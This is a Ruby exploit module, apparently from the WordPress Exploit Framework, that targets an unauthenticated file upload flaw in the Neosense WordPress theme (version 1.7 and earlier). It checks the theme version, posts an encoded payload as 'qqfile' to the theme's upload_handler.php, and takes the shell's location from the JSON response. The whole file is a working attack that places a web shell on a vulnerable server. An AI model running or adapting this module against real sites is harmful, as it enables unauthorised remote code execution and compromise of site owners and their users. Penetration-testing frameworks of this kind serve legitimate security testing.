# frozen_string_literal: true

class Wpxf::Exploit::NeosenseShellUpload < Wpxf::Module
  include Wpxf::WordPress::ShellUpload

  def initialize
    super

    update_info(
      name: 'Neosense Theme <= 1.7 Unauthenticated Shell Upload',
      author: [
        'Walter Hop', # Discovery and disclosure
        'rastating'   # WPXF module
      ],
      references: [
        ['WPVDB', '8622'],
        ['URL', 'https://lifeforms.nl/20160919/unrestricted-upload-neosense']
      ],
      date: 'Sep 19 2016'
    )
  end

  def check
    check_theme_version_from_style('neosense', '1.8')
  end

  def uploader_url
    normalize_uri(wordpress_url_themes, 'neosense', 'js', 'back-end', 'libraries', 'fileuploader', 'upload_handler.php')
  end

  def payload_body_builder
    builder = Utility::BodyBuilder.new
    builder.add_file_from_string('qqfile', payload.encoded, payload_name)
    builder
  end

  def uploaded_payload_location
    result = JSON.parse(upload_result.body)
    result['url']
  end
end
